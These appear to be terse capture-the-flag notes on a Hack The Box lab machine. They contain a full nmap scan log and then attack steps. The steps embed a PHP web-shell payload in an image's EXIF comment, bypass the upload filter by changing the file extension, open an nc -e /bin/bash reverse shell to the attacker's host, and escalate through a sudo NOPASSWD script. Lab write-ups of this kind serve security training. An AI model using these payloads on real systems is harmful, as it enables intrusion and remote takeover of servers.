```
Starting Nmap 7.80 ( https://nmap.org ) at 2019-08-25 23:52 IST
Initiating Service scan at 00:04
Scanning 2 services on 10.10.10.146
Completed Service scan at 00:04, 6.44s elapsed (2 services on 1 host)
Initiating OS detection (try #1) against 10.10.10.146
Retrying OS detection (try #2) against 10.10.10.146
Initiating Traceroute at 00:04
Completed Traceroute at 00:04, 0.23s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 00:04
Completed Parallel DNS resolution of 2 hosts. at 00:04, 0.00s elapsed
NSE: Script scanning 10.10.10.146.
Initiating NSE at 00:04
Completed NSE at 00:04, 6.33s elapsed
Initiating NSE at 00:04
Completed NSE at 00:04, 0.86s elapsed
Initiating NSE at 00:04
Completed NSE at 00:04, 0.00s elapsed
Nmap scan report for 10.10.10.146
Host is up (0.21s latency).
Not shown: 65532 filtered ports
PORT    STATE  SERVICE VERSION
22/tcp  open   ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b (RSA)
|   256 2d:63:28:fc:a2:99:c7:d4:35:b9:45:9a:4b:38:f9:c8 (ECDSA)
|_  256 73:cd:a0:5b:84:10:7d:a7:1c:7c:61:1d:f5:54:cf:c4 (ED25519)
80/tcp  open   http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
443/tcp closed https
Aggressive OS guesses: Linux 3.10 - 4.11 (94%), Linux 3.2 - 4.9 (91%), Linux 3.13 (90%), Linux 3.13 or 4.2 (90%), Linux 4.10 (90%), Linux 4.2 (90%), Linux 4.4 (90%), Asus RT-AC66U WAP (90%), Linux 3.10 (90%), Linux 3.11 - 3.12 (90%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 0.004 days (since Sun Aug 25 23:58:45 2019)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: All zeros

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   214.46 ms 10.10.14.1
2   214.88 ms 10.10.10.146

NSE: Script Post-scanning.
Initiating NSE at 00:04
Completed NSE at 00:04, 0.00s elapsed
Initiating NSE at 00:04
Completed NSE at 00:04, 0.00s elapsed
Initiating NSE at 00:04
Completed NSE at 00:04, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 759.76 seconds
           Raw packets sent: 130840 (5.760MB) | Rcvd: 775 (56.784KB)

```
```
DirBrute Forcing:
/backup (Status: 301) (gives a backup.tar file)
/index.php (Status: 200)
/uploads (Status: 301)

http://10.10.10.146/upload.php  (from backup) (use to upload shell)

exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' image.jpeg  (exiftool to write payload on image).

mv image.jpeg image.php.jpeg (Changing the extension)

http://10.10.10.146/uploads/10_10_14_12.php.jpeg?cmd=whoami  (Running the command)

nc -lvnp 5546 (running on attacker machine).

http://10.10.10.146/uploads/10_10_14_12.php.jpeg?cmd=nc 10.10.14.12 5546 -e /bin/bash & (Getting the reverse connection)  

sudo -l
(root) NOPASSWD: /usr/local/sbin/changename.sh
  
/sbin/ifup guly0


upgrade the shell using python

\ sh

```
